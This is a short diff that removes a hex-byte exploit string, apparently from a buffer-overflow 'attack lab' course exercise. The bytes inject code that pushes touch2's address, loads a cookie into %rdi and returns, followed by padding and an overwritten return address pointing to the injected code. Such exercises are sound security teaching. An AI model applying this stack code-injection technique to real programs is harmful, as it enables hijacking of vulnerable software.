@@ -1,4 +1,0 @@
-68 63 19 40 00				/* Push value of touch2 onto stack */
-48 c7 c7 6f 7c 6c 48 c3                 /* Move cookie into the %rdi and return */
-11 11 11 11 11 11 11 11 11 11 11        /* 11 bytes of padding */
-98 c0 66 55	        		/* Address of injected code */
